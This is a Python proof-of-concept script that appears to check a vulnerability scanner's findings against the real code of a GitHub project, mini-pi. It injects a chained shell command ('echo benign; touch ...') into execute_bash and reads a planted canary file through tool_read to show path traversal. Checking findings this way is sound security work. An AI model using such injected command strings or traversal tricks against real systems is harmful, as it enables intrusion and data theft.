#!/usr/bin/env python3
"""Manual PoC: reproduce, by hand, the two confirmed mini-pi findings on the REAL
shipped code -- independent of VULCAN -- to validate that a VULCAN "CONFIRMED"
verdict corresponds to a genuinely exploitable function.

It clones loveRhythm1990/mini-pi, extracts the REAL execute_bash() and tool_read()
source straight from the repo, runs each with a BENIGN proof payload, and checks
for the observable side effect. Nothing destructive: the command injection only
touches a temp file; the path traversal only reads a canary file we planted.

    python3 poc_minipi.py
"""
import ast
import os
import subprocess
import sys
import tempfile
from pathlib import Path

REPO = "https://github.com/loveRhythm1990/mini-pi.git"


def extract_func(repo: Path, name: str):
    """Return (file, source_text) for the first `def name` in the repo."""
    for py in repo.rglob("*.py"):
        try:
            src = py.read_text(encoding="utf-8", errors="replace")
            tree = ast.parse(src)
        except Exception:
            continue
        for n in ast.walk(tree):
            if isinstance(n, (ast.FunctionDef, ast.AsyncFunctionDef)) and n.name == name:
                seg = ast.get_source_segment(src, n)
                if seg:
                    return str(py.relative_to(repo)), seg
    return None, None


def load_func(src_text: str, name: str):
    """exec ONLY the function definition into a fresh namespace with stdlib avail."""
    ns = {"subprocess": subprocess, "os": os, "Path": Path}
    exec(compile(src_text, "<mini-pi-real-source>", "exec"), ns)
    return ns[name]


def main():
    work = Path(tempfile.mkdtemp(prefix="minipi_poc_"))
    clone = work / "repo"
    print(f"[*] cloning {REPO}")
    r = subprocess.run(["git", "clone", "--depth", "1", REPO, str(clone)],
                       capture_output=True, text=True)
    if r.returncode != 0:
        print("clone failed:", r.stderr[-300:]); sys.exit(1)

    # ---------- CWE-78: execute_bash(command) -> subprocess.run(shell=True) ----------
    f_file, f_src = extract_func(clone, "execute_bash")
    print(f"\n=== CWE-78 execute_bash  [{f_file}] ===")
    print(f_src.splitlines()[0], "...")
    execute_bash = load_func(f_src, "execute_bash")
    marker = work / "PWNED_rce"
    payload = f"echo benign; touch {marker}"      # injected via the command string
    print(f"[*] calling execute_bash({payload!r})")
    try:
        execute_bash(payload)
    except Exception as e:
        print("   (call raised, that's fine if the side effect still fired):", e)
    print(f"[+] command injection {'CONFIRMED' if marker.exists() else 'did NOT fire'}: "
          f"{marker} exists = {marker.exists()}")

    # ---------- CWE-22: tool_read(path) -> open(path) (traversal, breaks 'cwd-only') ----------
    t_file, t_src = extract_func(clone, "tool_read")
    if t_src:
        print(f"\n=== CWE-22 tool_read  [{t_file}] ===")
        print(t_src.splitlines()[0], "...")
        tool_read = load_func(t_src, "tool_read")
        secret = work / "secret_canary.txt"
        secret.write_text("CANARY-abc123")
        # the docstring claims 'relative to current working directory'; prove an
        # ABSOLUTE path outside cwd is read anyway (contract violation = real bug)
        got = tool_read(str(secret))
        leaked = "CANARY-abc123" in str(got)
        print(f"[*] calling tool_read({str(secret)!r})  (absolute path, outside any cwd sandbox)")
        print(f"[+] path traversal {'CONFIRMED' if leaked else 'did NOT fire'}: "
              f"canary leaked = {leaked}")

    print(f"\n[*] cleanup: rm -rf {work}")
    subprocess.run(["rm", "-rf", str(work)])


if __name__ == "__main__":
    main()
